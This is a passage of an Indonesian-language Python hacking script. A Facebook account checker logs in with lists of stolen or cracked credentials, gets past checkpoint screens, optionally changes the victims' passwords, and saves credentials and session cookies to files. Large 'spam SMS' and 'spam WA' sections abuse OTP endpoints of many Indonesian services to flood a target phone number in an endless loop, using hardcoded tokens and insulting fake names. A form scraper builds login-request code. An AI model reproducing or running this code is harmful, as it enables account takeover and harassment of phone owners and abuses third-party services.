	jalan("%s%s%s\033[0mMode Pesawatkan Terlebih Dahulu 5 Detik "%(P,til,P))
	pw=input("\n%s%s%s\033[0mUbah Sandi Pada Akun One Tab? y/t %s> %s"%(P,til,P,P,P))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s\033[0mMasukan Sandi %s> %s"%(P,til,P,P,P))
		if len(pw2) <= 5:
			print("%s%s Sandi Minimal 6 Karakter "%(P,til))
		else:
			pwbaru.append(pw2)
	print ("%s%s%s\033[0mTotal Akun %s: %s%s "%(P,til,P,P,P,str(len(file_cp))))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		print("\n%s%s.%s\033[0mLogin Akun %s> %s%s"%(P,str(nomor),P,P,P,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n%s%s%s\033[0mSelesai Mengecek Akun"%(P,til,P));jeda(0.07)
	input('%s%s%s[%s Enter%s ]'%(P,til,P,P,P))
	exit()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	url = "https://m.facebook.com"
	ua = "Mozilla/5.0 (Linux; Android 10; 545B) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36"
	session.headers.update({"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"ua"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m Akun Terkunci Sesi New"%(P,til))
		else:
			print("\r%s%s\033[0m Akun Tidak Checkpoint, Silahkan Anda Login "%(til,P))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s [+] %s\033[0mterdapat %s%s%s \033[0mopsi %s:"%(P,P,P,str(len(cek)),P,P));jeda(0.07)
		if(len(cek)==0):
			if "Lihat Detail Login Yang Ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s\033[0mAkun One Tab, Sandi Berhasil Di Ubah \n [+] OK %s%s%s|%s|%s			"%(P,til,P,P,user,pwbaru[0],coki))
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (P,user,pwbaru[0],coki))
				else:
					print("\r%s%s \033[0mAkun One Tab, Silahkan Anda Login		"%(P,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (P,user,pw,coki))
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s [+] \033[0mAkun Terpasang Autentikasi Dua Faktor			"%(P))
			else:
				print("%s%s\033[0mTerjadi Kesalahan"%(P,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s Akun Tidak Checkpoint, Silahkan Anda Login "%(P))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (P,user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),P,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s [+] %s"%(P,oh))
	else:
		print("%s [+] \033[0mLogin Gagal, Silahkan Cek Kembali Id Dan Kata Sandi"%(P))
		  
#-----------------------[ DEFF SCRAPT METODE ]--------------------#
from bs4 import BeautifulSoup as bs
from datetime import datetime
from itertools import count 
from requests import get 
from bs4 import BeautifulSoup 
from rich import print as cetak
from rich import print as prints
from rich.panel import Panel as nel
done = False 
results = [] 

def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")

def start():
    global Mulai_Jalan
    Mulai_Jalan = datetime.now()
def akhir():
    global Akhir_Jalan, Total_Waktu
    Akhir_Jalan = datetime.now()
    Total_Waktu = Akhir_Jalan - Mulai_Jalan
    try:
        Menit = str(Total_Waktu).split(':')[1]
        Detik = str(Total_Waktu).split(':')[2].replace('.',',').split(',')[0] + ',' + str(Total_Waktu).split(':')[2].replace('.',',').split(',')[1][:1]
        print('\n [+] Program Selesai Dalam Waktu %s Menit %s Detik\n'%(Menit,Detik))
    except Exception as e:
        print('\n\n [+] Program Selesai Dalam Waktu 0 Detik\n')

class get_data_web:
    
    def __init__(self):
        self.xyz = requests.Session()
        url = input(' [+] Masukkan URL : ')
        print('\n [1] Source Payload')
        print(' [2] Parsed Payload')
        print(' [3] Source Code Post Requests')
        self.tanya = input(' [+] Pilih : ')
        self.domain = url.split('/')[2]
        self.get_form(url)
       
    def get_form(self,url):
        req = self.xyz.get(url)
        raq = bs(req.content,'html.parser')
        for x in raq.find_all('form'):
            if self.tanya in ['1','01','a']: self.printing1(req,x)
            elif self.tanya in ['2','02','b']: self.printing2(req,x)
            elif self.tanya in ['3','03','c']: self.printing3(url,req,x)
            else: exit('\n [+] Isi Yang Benar Asu')

    def get_head1(self,req):
        data = {}
        head = req.headers
        usls = ['cookie','set-cookie','report-to','expires','x-fb-debug','date','last-modified','etag']
        for x,y in zip(head.keys(),head.values()):
            try:
                if x.lower() in usls: continue
                else: data.update({x:y})
            except Exception as e:continue
        return(data)

    def get_data1(self,form):
        data = {}
        for y in form.find_all('input'):
            try:data.update({y['name']:y['value']})
            except Exception as e:continue
        return(data)

    def get_data2(self,form):
        data = []
        for y in form.find_all('input'):
            try:data.append(y)
            except Exception as e:continue
        return(data)

    def get_post1(self,form):
        z = form['action']
        if 'https://'+self.domain in z: return(z)
        elif 'http://'+self.domain in z: return(z)
        else: return('https://%s%s'%(self.domain,z))

    def printing1(self,req,x):
        head = self.get_head1(req)
        data = self.get_data1(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        print('\n\n[SOURCE PAYLOAD]\n')
        print('[Host] %s'%(self.domain))
        print('[Head] %s'%(head))
        print('[Data] %s'%(data))
        print('[Coki] %s'%(coki))
        print('[Post] %s'%(post))

    def printing2(self,req,x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        print('\n\n[PARSED PAYLOAD]\n')
        print('head = {')
        for x,y in zip(head.keys(),head.values()):
            print('    %s%s: %s'%(x,' '*(29-len(x)),y))
        print('    }')
        print('data = {')
        for x in data:
            try:
                if 'value' in str(x):
                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)
                    fp = re.search('value="(.*?)"',str(dp)).group(1)
                    print("    %s%s: '%s',"%(x['name'],' '*(19-len(x['name'])),fp))
                elif 'name' in str(x):
                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))
                else: continue
            except Exception as e: continue
        print('    }')
        print('cookie = {')
        for x,y in zip(coki.keys(),coki.values()):
            print('    %s%s: %s'%(x,' '*(5-len(x)),y))
        print('    }')
        print("next = '%s'"%(post))
        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")
    def printing3(self,url,req,x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        print('\n\n[SOURCE CODE POST REQUESTS]\n')
        print("url  = '%s'"%(url))
        print("requ = bs(requests.Session().get(url).content,'html.parser')")
        print('head = {')
        for x,y in zip(head.keys(),head.values()):
            print('    %s%s: %s'%(x,' '*(29-len(x)),y))
        print('    }')
        print('data = {')
        for x in data:
            try:
                if 'value' in str(x):
                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)
                    fp = re.search('value="(.*?)"',str(dp)).group(1)
                    gp = dp.replace(fp,'(.*?)')
                    rs = ("re.search('%s',str(requ)).group(1)"%(gp))
                    print('    %s%s: %s,'%(x['name'],' '*(19-len(x['name'])),rs))
                elif 'name' in str(x):
                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))
                else: continue
            except Exception as e: continue
        print('    }')
        print("cookie = requests.Session().cookies.get_dict()")
        print("next = '%s'"%(post))
        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")

#------------------[ DEFF SPAM SMS ]-------------------#

agent = random.choice(
		[
			"Mozilla/5.0 (Linux; Android 6.0.1; SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 5.0; SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36"
			"Mozilla/5.0 (Linux; Android 10; SM-A305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
	]
)

def process_data1():
	sleep(0.10)
	
def spam_sms():
	global nomor 
	cetak(panel(f'''   Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
	nomor = input(f" [+] Input No Hp : +62").replace("+62","")
	if nomor == "":
		pass
	else:
		while True:
			for _ in track(range(100), description=f' [+] Sedang Spam...'):process_data1()
			sxp_sms()

class sxp_sms:

	def __init__(self):
		self.req = requests.Session()
		self.main()

	def sms_otp_1(self, no):
		__req__ = self.req.post("https://service.mokapos.com/account/v1/verification/phone/send",
			headers = {
				  "accept": "application/json, text/plain, */*",
				  "authorization": "undefined",
				  "save-data": "on",
				  "user-agent": agent,
				  "content-type": "application/json;charset=UTF-8"
				},
			json = {
				 "phone_number": f"+62{no}"
			  }
		).text

	def sms_otp_2(self, no):
		data = json.dumps({
					"mobile": f"0{no}",
					"noise": "1583590641573155574",
					"request_time": "158359064157312",
					"access_token": "11111"
				   })
		__req__ = self.req.post("https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code",
			headers = {
				    "accept": "text/html, application/xhtml+xml, application/json, */*",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
				    "content-length": "166",
				    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
				    "origin": "https://h5.rupiahcepatweb.com",
				    "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
				    "sec-fetch-dest": "empty",
				    "sec-fetch-mode": "cors",
				    "sec-fetch-site": "same-site",
				    "user-agent": agent
				  },
			data = {
				 "data": data
			   }
		).text

	def sms_otp_3(self, no):
		__req__ = self.req.post("https://www.olx.co.id/api/auth/authenticate",
			headers = {
				    "accept": "*/*",
				    "x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
				    "x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063",
				    "user-agent": agent,
				    "content-type": "application/json"
				  },
			json = {
				 "grantType": "retry",
				 "method": "sms",
				 "phone": no,
				 "language": "id"
				}
		).text

	def sms_otp_4(self, no):
		__req__ = self.req.post("https://www.alodokter.com/login-with-phone-number",
			headers = {
				    "user-agent": agent,
				    "content-type": "application/json",
				    "referer": "https://www.alodokter.com/login-alodokter",
				    "accept": "application/json",
				    "origin": "https://www.alodokter.com"
				  },
			json = {
				 "user":{
					  "phone": f"0{no}"
					}
				}
		).text

	def sms_otp_5(self, no):
		__req__ = self.req.post("https://www.kelaspintar.id/user/otpverification",
			headers = {
				    "x-requested-with": "XMLHttpRequest",
				    "user-agent": agent,
				    "Referer": "https://www.kelaspintar.id/"
				  },
			data = {
				 "user_mobile": no,
				 "otp_type": "send_otp_reg",
				 "mobile_code": "%2B62"
				}
		).text

	def sms_otp_6(self, no):
		aink_sanz = random.choice(
						[
							"Hallo Mantan",
							"Hallo Bangsad",
							"Hallo Sayang",
							"Hallo Ripper",
							"Hallo Ngab"
						]
					)
		email = random.choice(
					[
						"nsnsmsmksksmsm@gmail.com",
						"lavon.lockman@gmail.com",
						"duane_mclaughlin38@gmail.com",
						"alfreda.lindgren@gmail.com",
						"leonardo_kuhlman@gmail.com",
						"lyric51@gmail.com",
						"devonte_littel@gmail.com",
						"newell.kuhic@gmail.com"
					]
				)
		pw = random.choice(
					[
						"mamsmms123",
						"Wadepak1037",
						"waifugw1011"
					]
				)
		birth_date = random.choice(
						[
							"13/09/1999",
							"04/02/2022",
							"05/02/2022",
							"05/02/2022",
							"06/02/2022",
							"10/02/2022"
						]
	)
		__req__ = self.req.post("https://www.matahari.com/rest/V1/thorCustomers",
			json = {
				"thor_customer":{
						"name": aink_sanz,
						"card_number": None,
						"email_address": email,
						"mobile_country_code": "+62",
						"gender_id": "1",
						"mobile_number": f"0{no}",
						"mro": "",
						"password": pw,
						"birth_date": birth_date
						}
				},
			headers = {
					"Host": "www.matahari.com",
					"x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
					"origin": "https://www.matahari.com",
					"user-agent": agent,
					"content-type": "application/json",
					"accept": "*/*",
					"x-requested-with": "XMLHttpRequest",
					"referer": "https://www.matahari.com/customer/account/create/",
					"accept-encoding": "gzip, deflate, br",
					"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}

		).text

	def sms_otp_7(self, no):
		__req__ = self.req.post("https://api.duniagames.co.id/api/user/api/v2/user/send-otp",
			headers = {
				    "Host": "api.duniagames.co.id",
				    "content-length": "32",
				    "accept": "application/json, text/plain, */*",
				    "x-device": "cc45ed83-73bd-4a98-83e3-874e8bc11a7f",
				    "accept-language": "id",
				    "user-agent": agent,
				    "ciam-type": "FR",
				    "content-type": "application/json",
				    "origin": "https://duniagames.co.id",
				    "sec-fetch-site": "same-site",
				    "sec-fetch-mode": "cors",
				    "sec-fetch-dest": "empty",
				    "referer": "https://duniagames.co.id/",
				    "accept-encoding": "gzip, deflate, br"
				  },
			json = {
				 "phoneNumber": f"+62{no}"
				}
		).text

	def sms_otp_8(self, no):
		__req__ = self.req.post("https://harvestcakes.com/register",
			headers = {
				    "user-agent": agent,
				    "Referer": "https://harvestcakes.com/register"
				  },
			data = {
				 "phone": f"0{no}",
				 "url": ""
				}
		).text

	def sms_otp_9(self, no):
		__req__ = self.req.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",
			headers = {
				    "Host": "identity-gateway.oyorooms.com",
				    "consumer_host": "https://www.oyorooms.com",
				    "accept-language": "id",
				    "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
				    "user-agent": agent,
				    "Content-Type": "application/json",
				    "accept": "*/*",
				    "origin": "https://www.oyorooms.com",
				    "referer": "https://www.oyorooms.com/login",
				    "Accept-Encoding": "gzip, deflate, br"
				  },
			json = {
				 "phone": f"0{no}",
				 "country_code": "+62",
				 "country_iso_code": "ID",
				 "nod": "4",
				 "send_otp": "true",
				 "devise_role": "Consumer_Guest"
				}
		).text

	def sms_otp_10(self, no):
		__req__ = self.req.post("https://crp-app.stamps.co.id/api/auth/validate-mobile-number",
			json = {
				"mobile_number": f"0{no}",
				"token": "sI01tF5bOSYHabS7HaXiB1k3j0JxFxbcQ79Rd1HFBjKEKJqYAwSNMScsx9AEZq3O"
				},
			headers = {
					"Host": "crp-app.stamps.co.id",
					"content-type": "application/json; charset=utf-8",
					"content-length": "106",
					"accept-encoding": "gzip",
					"User-Agent": agent
			}
		).text

	def sms_otp_11(self, no):
		__req__ = self.req.post("https://app-api.kredito.id/client/v1/common/verify-code/send",
			headers = {
				    "LPR-TIMESTAMP": "1603281035821",
				    "Accept-Language": "id-ID",
				    "LPR-BRAND": "Kredito",
				    "LPR-PLATFORM": "android",
				    "user-agent": agent,
				    "Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks",
				    "LPR-SIGNATURE": "e15dbea8602409df32a2ed5a123dc244",
				    "Content-Type": "application/json; charset=UTF-8",
				    "Content-Length": "79"
				   },
			data = '{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}' % no
		).text

	def sms_otp_12(self, no):
		__req__ = self.req.post("https://www.autofun.co.id:443/v2/captcha/sms",
			headers = {
					"Host": "www.autofun.co.id",
					"Connection": "keep-alive",
					"Content-length": "84",
					"accept": "*/*",
					"user-agent": agent,
					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
					"content-type": "application/json;charset=UTF-8",
					"Origin": "https://www.autofun.co.id",
					"X-Requested-With": "acr.browser.barebones",
					"Sec-Fetch-Site": "same-origin",
					"Sec-Fetch-Mode": "cors",
					"Sec-Fetch-Dest": "empty",
					"Referer": "https://www.autofun.co.id/mobil/datsun",
					"Accept-Encoding": "gzip, deflate"
				},
			json = {
					"phoneNum": f"62{no}",
					"languageCode": "id-id",
					"countryCode": "id",
					"platform": 2
			}
		).text

	def sms_otp_13(self, no):
		__req__ = self.req.post("https://api.myfave.com/api/fave/v3/auth",
			json = {
					"phone":"+62"+no
				},
			headers = {
					"Host": "api.myfave.com",
					"Connection": "keep-alive",
					"x-user-agent": "Fave-PWA/v1.0.0",
					"Origin": "https://m.myfave.com",
					"user-agent": agent,
					"content-type": "application/json",
					"Accept": "*/*",
					"Referer": "https://m.myfave.com/jakarta/auth",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
			}
		).text

	def sms_otp_14(self, no):
		nickname = random.choice(
					  [
					    "fahmi",
					    "xzc0der",
					    "bed3bah",
					    "xmanz"
					  ]
					)
		angka = random.randint(
					111,
					999
				      )
		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
			headers = {
				    "Host": "wong.kitabisa.com",
				    "x-ktbs-platform-name": "pwa",
				    "origin": "https://account.kitabisa.com",
				    "x-ktbs-time": "1611020248",
				    "user-agent": agent,
				    "x-ktbs-api-version": "1.0.0",
				    "accept": "application/json",
				    "x-ktbs-client-name": "kanvas",
				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
				    "x-ktbs-client-version": "1.0.0",
				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
				    "version": "3.4.0",
				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				  },
			json = {
				 "full_name": nickname+str(angka),
				 "username": f"62{no}",
				 "otp_type": "sms"
				}
		).text

	def main(self):
		self.sms_otp_1(nomor)
		self.sms_otp_2(nomor)
		self.sms_otp_3(nomor)
		self.sms_otp_4(nomor)
		self.sms_otp_5(nomor)
		self.sms_otp_6(nomor)
		self.sms_otp_7(nomor)
		self.sms_otp_8(nomor)
		self.sms_otp_9(nomor)
		self.sms_otp_10(nomor)
		self.sms_otp_11(nomor)
		self.sms_otp_12(nomor)
		self.sms_otp_13(nomor)
		self.sms_otp_14(nomor)
		cetak(panel(f"Sukses Spam SMS Ke No : +62{nomor}",width=90,padding=(0,2),style=f"bold white"))

#------------------[ DEFF SPAM WA ]-------------------# 
    
def spam_wa():
	global nomor
	cetak(panel(f'''   Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
	nomor = input(f" [+] Input No Hp : +62").replace("+62","")
	if nomor == "":
		pass
	else:
		while True:
			for _ in track(range(100), description=f' [+] Sedang Spam...'):process_data1()
			sxp_wa()
			
class sxp_wa:

	def __init__(self):
		self.req = requests.Session()
		self.main()

	def wa_otp_1(self, no):
		nickname = random.choice(
					  [
					    "fahmi",
					    "xzc0der",
					    "bed3bah",
					    "xmanz"
					  ]
					 )
		angka = random.randint(
					111,
					999
				       )
		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
			headers = {
				    "Host": "wong.kitabisa.com",
				    "x-ktbs-platform-name": "pwa",
				    "origin": "https://account.kitabisa.com",
				    "x-ktbs-time": "1611020248",
				    "user-agent": agent,
				    "x-ktbs-api-version": "1.0.0",
				    "accept": "application/json",
				    "x-ktbs-client-name": "kanvas",
				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
				    "x-ktbs-client-version": "1.0.0",
				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
				    "version": "3.4.0",
				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				   },
			json = {
				 "full_name": nickname+str(angka),
				 "username": f"0{no}",
				 "otp_type": "whatsapp"
				}
		).text

	def wa_otp_2(self, no):
		__req__ = self.req.get(
			f"https://m.redbus.id/api/getOtp?number={no}&cc=62&whatsAppOpted=true"
		).text

	def wa_otp_3(self, no):
		__req__ = self.req.post("https://api.bukuwarung.com/api/v1/auth/otp/send",
			headers = {
				    "Accept": "application/json",
				    "X-APP-VERSION-NAME": "3.4.0",
				    "X-APP-VERSION-CODE": "3399",
				    "Content-Type": "application/json; charset=UTF-8",
				    "Host": "api.bukuwarung.com",
				    "Connection": "Keep-Alive",
				    "Accept-Encoding": "gzip",
				    "User-Agent": agent
				   },
			json = {
				 "action": "LOGIN_OTP",
				 "countryCode": "62",
				 "deviceId": "00000177-142d-f1a2-bac4-57a9039fdc4d",
				 "method": "WA",
				 "phone": no
				}
		).text

	def wa_otp_4(self, no):
		__req__ = self.req.post("https://evermos.com/api/client/request-code",
			headers = {
				    "user-agent": agent
				  },
			data = {
				 "telephone": f"62{no}",
				 "type": 0
				}
		).text

	def wa_otp_5(self, no):
		__req__ = self.req.post("https://wapi.ruparupa.com/auth/generate-otp",
			headers = {
				    "Host": "wapi.ruparupa.com",
				    "Connection": "keep-alive",
				    "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
				    "Accept": "application/json",
				    "Content-Type": "application/json",
				    "X-Company-Name": "odi",
				    "user-agent": agent,
				    "user-platform": "mobile",
				    "X-Frontend-Type": "mobile",
				    "Origin": "https://m.ruparupa.com",
				    "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
				    "Accept-Encoding": "gzip, deflate, br",
				    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				   },
			json = {
				 "phone": f"0{no}",
				 "action": "register",
				 "channel": "chat",
				 "email": "",
				 "customer_id": "0",
				 "is_resend": 0
				}
		).text

	def wa_otp_6(self, no):
		headers = {
			    "Connection": "keep-alive",
			    "Accept": "application/json, text/javascript, */*; q=0.01",
			    "Origin": "https://accounts.tokopedia.com",
			    "X-Requested-With": "XMLHttpRequest",
			    "user-agent": agent,
			    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
			    "Accept-Encoding": "gzip, deflate",
			   }
		site = self.req.get("https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn="+ no +"&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D", headers = headers).text
		search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
		data = {
			 "otp_type": "116",
			 "msisdn": no,
			 "tk": search,
			 "email": "",
			 "original_param": "",
			 "user_id": "",
			 "signature": "",
			 "number_otp_digit": "6",
			}
		__req__ = self.req.post(
				"https://accounts.tokopedia.com/otp/c/ajax/request-wa", headers = headers, data = data
	   ).text

	def main(self):
		self.wa_otp_1(nomor)
		self.wa_otp_2(nomor)
		self.wa_otp_3(nomor)
		self.wa_otp_4(nomor)
		self.wa_otp_5(nomor)
		self.wa_otp_6(nomor)
		cetak(panel(f" Sukses Spam WA Ke No : +62{nomor}",width=90,padding=(0,2),style=f"bold white"))

#------------------[ IMPORT MODULE ]-------------------#
try:
    import re
    import os
    import sys
    import json
    import bs4
    import uuid
    import hmac
    import hashlib
    import urllib
    import urllib.request
    import calendar
    import requests
    import random
    import datetime
    import time
    from time import sleep
    from datetime import datetime
    from concurrent.futures import ThreadPoolExecutor
    from requests.exceptions import ConnectionError
except ImportError as e:
   exit(f"\n Module {e} Error")

#------------------[ IMPORT RICH ]-------------------#
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich import print as cetak
from rich.progress import track
from bs4 import BeautifulSoup as sop
from rich.panel import Panel as nel
from rich.table import Table as me
from rich.columns import Columns
from rich.table import Table as me
from rich.console import Console as sol
from rich.console import Console as sol
console = Console()
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn

#------------------[ GLOBAL NAME ]-------------------#
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],['sukses']
method, xxkontol, BrayGagah, BrayUarand, proxxy, UserBrayCrack = [], [], [], [], [], []
batam=[]
s = requests.Session()
day = datetime.now().strftime("%d-%b-%Y")
nyMnD, nyMxD, menudump, = 5, 10, []
current_GMT = time.gmtime(time.time())

#------------------[ DEF BULAN ]-------------------#
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

#------------------[ INSTAGRAM LOGIN ]-------------------#
insta_log = "https://www.instagram.com/accounts/login/?force_classic_login=&"
url        = "https://i.instagram.com/"

#------------------[ COLOUR FOR PRINT ]-------------------#
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
H = "\033[0;92m" # HIJAU
K = "\033[0;93m" #KUNING
M = '\x1b[1;91m' # MERAH
P = "\033[0m" # PUTIH

#------------------[ WARNA FOR RICH ]-------------------#
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

#------------------[ RANDOM COLOR RICH ]-------------------#
L1 = "[#875f5f]" # LIGHT
G1  = "[#ffd700]" # GOLD
M1  = "[#875fd7]" # MEDIUM GREEN
P1   = "[#FF00FF]" # PINK
W1  = "[#FFFFFF]" # WHITE
S1   = "[#87afff]" # SKY BLUE
O1   = "[#d78700]" # ORANGE3
O3   = "[#ff5fff]" # MEDIUM ORCH3

#------------------[ COLOR TABLE FOR RICH ]-------------------#
LIGHT = "#875f5f" # LIGHT
GOLD    = "#ffd700" # GOLD
MEDIUM  = "#875fd7" # MEDIUM GREEN
PINK    = "#FF00FF" # PINK
WHITE  = "#FFFFFF" # WHITE
